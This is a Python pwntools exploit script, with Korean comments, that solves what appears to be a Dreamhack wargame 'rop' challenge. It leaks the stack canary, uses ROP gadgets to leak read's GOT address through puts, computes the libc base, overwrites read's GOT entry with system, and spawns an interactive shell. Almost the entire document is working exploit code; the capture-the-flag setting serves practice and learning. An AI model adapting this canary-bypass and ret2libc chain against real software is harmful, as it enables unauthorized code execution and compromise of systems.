from pwn import *

p = remote("host3.dreamhack.games", 21581)

e = ELF("./rop")
libc = ELF("./libc-2.27.so") # 원격
#gadget

pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1
ret = 0x000000000040055e

# 변수 초기화
payload = b''
read = b''

# Canary leak
canary = b''
leak = b''
leak += b'A' * 57
p.sendafter("Buf: ", leak)
p.recvuntil(leak)
canary += b'\x00'
canary += p.recv(7)

# plt, got
read_got = e.got['read']
read_plt = e.plt['read']
puts_plt = e.plt['puts']


# Canary 우회
payload += b'A' *56
payload += canary
payload += b'B' * 8

# puts(read_got)
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)

# system("/bin/sh")
# plt -> got (system)
# read plt -> got (system) 할 수 있도록 
# read의 got에 system 절대 경로 삽입

# read(0, read_got, 16)
payload += p64(pop_rdi) + p64(0x0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x10)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(read_plt)

p.sendafter("Buf: ", payload)


# read절대주소가 0x0000????.. 라고 한다면
# puts(read_got)이 그 주소를 packing한.. 6바이트만 출력한다.
read += p.recvn(6)
read += b"\x00" * 2
# 따라서 뒤에 \x00 2개 더 붙이고

# unpacking해서 base addr 구한다.
lb = u64(read) - libc.symbols["read"]
system = lb + libc.symbols["system"]

p.sendline(p64(system) + b"/bin/sh\x00")


p.interactive()